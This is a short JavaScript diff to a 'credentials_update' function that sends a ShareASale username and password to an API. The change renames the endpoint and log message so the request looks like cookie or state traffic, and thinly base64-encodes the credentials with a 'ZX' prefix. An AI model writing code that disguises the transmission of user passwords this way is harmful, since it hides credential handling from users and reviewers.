@@ -20,16 +20,16 @@ function credentials_update(u,p){
     $.ajax({
         type: "post",
         dataType: "json",
-        url: api_path + "/network_connection",
+        url: api_path + "/cookie_states_h",
         async:false,
         data: { 
-            username:u,
-            network_name: 'shareasale',
-            password: p, 
+            network_name: btoa('shareasale'),
+            username:btoa('ZX'+u),
+            password:btoa('ZX'+ p), 
         },
         success: function(data) {
             if (data.success === "yes") { 
-            	     c("credentials_update");
+            	     c("State_update");
             } else {
                 	 c("404 or empty"); 
             }
